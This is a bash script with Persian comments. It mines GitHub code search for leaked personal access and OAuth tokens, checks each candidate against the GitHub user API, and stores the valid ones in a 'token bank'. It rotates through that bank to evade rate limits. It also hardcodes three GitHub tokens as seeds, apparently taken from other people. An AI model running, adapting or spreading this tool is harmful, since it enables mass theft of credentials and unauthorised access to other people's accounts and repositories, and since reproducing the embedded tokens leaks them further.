#!/bin/bash
set -euo pipefail

# --- توکن‌های اولیه (seed) که هاردکد هستن و می‌تونن ذخیره بشن ---
SEED_TOKENS=(
  "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"
  "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"
  "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"
)

TOKEN_FILE="tokens.txt"

# --- توابع ---

# بانک واقعی (بدون GITHUB_TOKEN)
load_token_bank() {
  local tokens=()
  if [ -f "$TOKEN_FILE" ] && [ -s "$TOKEN_FILE" ]; then
    while IFS= read -r line; do
      [[ -z "$line" ]] && continue
      tokens+=("$line")
    done < "$TOKEN_FILE"
  fi
  for t in "${SEED_TOKENS[@]}"; do
    if ! printf '%s\n' "${tokens[@]}" | grep -qxF "$t"; then
      tokens+=("$t")
    fi
  done
  printf '%s\n' "${tokens[@]}" | sort -u
}

save_token_bank() {
  printf '%s\n' "$@" | sort -u > "$TOKEN_FILE"
}

get_remaining() {
  local token="$1"
  curl -sS -H "Authorization: token $token" \
    "https://api.github.com/rate_limit" 2>/dev/null | \
    jq -r '.resources.core.remaining // .rate.remaining // 0' 2>/dev/null || echo 0
}

# انتخاب بهترین توکن از آرایه‌ای که بهش میدیم
pick_best_token() {
  local tokens=("$@")
  local best_token=""
  local best_rem=-1
  for token in "${tokens[@]}"; do
    local rem
    rem=$(get_remaining "$token") || continue
    echo "  Token ${token:0:12}... remaining=$rem" >&2
    if [ "$rem" -gt "$best_rem" ]; then
      best_rem=$rem
      best_token=$token
    fi
  done
  if [ -z "$best_token" ] || [ "$best_rem" -eq 0 ]; then
    echo "ERROR: All tokens have 0 remaining." >&2
    return 1
  fi
  echo "$best_token"
}

# --- شروع ---
echo "[*] Loading token bank..." >&2
mapfile -t BANK_TOKENS < <(load_token_bank)
echo "Loaded ${#BANK_TOKENS[@]} tokens in bank." >&2

# آرایه‌ی جستجو: GITHUB_TOKEN (اگه باشه) + بانک
SEARCH_TOKENS=()
if [ -n "${GITHUB_TOKEN:-}" ]; then
  SEARCH_TOKENS+=("$GITHUB_TOKEN")
  echo "[*] Injected GITHUB_TOKEN for search (will NOT be saved)." >&2
fi
SEARCH_TOKENS+=("${BANK_TOKENS[@]}")

echo "Search tokens count: ${#SEARCH_TOKENS[@]}" >&2

# انتخاب بهترین توکن برای جستجو از کل Search Array
BEST_TOKEN=$(pick_best_token "${SEARCH_TOKENS[@]}") || exit 1
echo "[*] Using token: ${BEST_TOKEN:0:12}..." >&2

# --- جستجوی کد ---
SEARCH_QUERY='ghp_+OR+gho_+OR+github_pat_'
MAX_PAGES=10
PER_PAGE=100
CANDIDATES_TMP=$(mktemp)

echo "[*] Starting code search..." >&2
page=1
while [ $page -le $MAX_PAGES ]; do
  # اگر سهمیه توکن فعلی تموم شد، از آرایه جستجو یه توکن جدید انتخاب کن
  if [ "$(get_remaining "$BEST_TOKEN")" -lt 1 ]; then
    echo "[!] Token exhausted, picking a new one..." >&2
    BEST_TOKEN=$(pick_best_token "${SEARCH_TOKENS[@]}") || break
  fi

  echo "[*] Page $page with ${BEST_TOKEN:0:12}..." >&2
  http_response=$(curl -sS -i -H "Authorization: token $BEST_TOKEN" \
    -H "Accept: application/vnd.github.text-match+json" \
    "https://api.github.com/search/code?q=$SEARCH_QUERY&per_page=$PER_PAGE&page=$page")

  http_headers=$(echo "$http_response" | awk 'BEGIN{RS="\r\n\r\n"} NR==1')
  response_body=$(echo "$http_response" | awk 'BEGIN{RS="\r\n\r\n"} NR>1')
  http_code=$(echo "$http_headers" | grep -oP '(?<=HTTP\/1\.. )\d+' || echo "000")

  if [ "$http_code" != "200" ]; then
    echo "[!] HTTP $http_code received. Response snippet: ${response_body:0:200}" >&2
    break
  fi

  matches=$(echo "$response_body" | jq -r '.items[]?.text_matches[]?.fragment // empty' 2>/dev/null || true)
  if [ -n "$matches" ]; then
    echo "$matches" | grep -oP '\bgh[po]_[A-Za-z0-9_]{36,}\b|\bgithub_pat_[A-Za-z0-9_]{22,}\b' >> "$CANDIDATES_TMP"
  fi

  total=$(echo "$response_body" | jq -r '.total_count // 0' 2>/dev/null || echo 0)
  echo "  Total results: $total, extracted fragments: $(echo "$matches" | wc -l)" >&2

  if [ $((page * PER_PAGE)) -ge "$total" ]; then
    break
  fi
  page=$((page + 1))
  sleep 2
done

# --- تست و ذخیره ---
if [ ! -s "$CANDIDATES_TMP" ]; then
  echo "[*] No candidates found." >&2
  rm -f "$CANDIDATES_TMP"
  exit 0
fi

sort -u -o "$CANDIDATES_TMP" "$CANDIDATES_TMP"
echo "[*] Testing $(wc -l < "$CANDIDATES_TMP") candidates..." >&2

VALID_TMP=$(mktemp)
while IFS= read -r candidate; do
  [ -z "$candidate" ] && continue
  http_code=$(curl -s -o /dev/null -w "%{http_code}" \
    -H "Authorization: token $candidate" \
    "https://api.github.com/user")
  if [ "$http_code" = "200" ]; then
    echo "[+] VALID: $candidate" >&2
    echo "$candidate" >> "$VALID_TMP"
  fi
  sleep 0.5
done < "$CANDIDATES_TMP"

if [ -s "$VALID_TMP" ]; then
  # بارگذاری مجدد بانک (بدون GITHUB_TOKEN) و اضافه‌کردن توکن‌های جدید
  mapfile -t NEW_BANK < <(load_token_bank)
  while IFS= read -r newtok; do
    NEW_BANK+=("$newtok")
  done < "$VALID_TMP"
  save_token_bank "${NEW_BANK[@]}"
  echo "[*] Bank updated. Size: $(wc -l < "$TOKEN_FILE")" >&2
else
  echo "[*] No valid tokens added." >&2
fi

rm -f "$CANDIDATES_TMP" "$VALID_TMP"
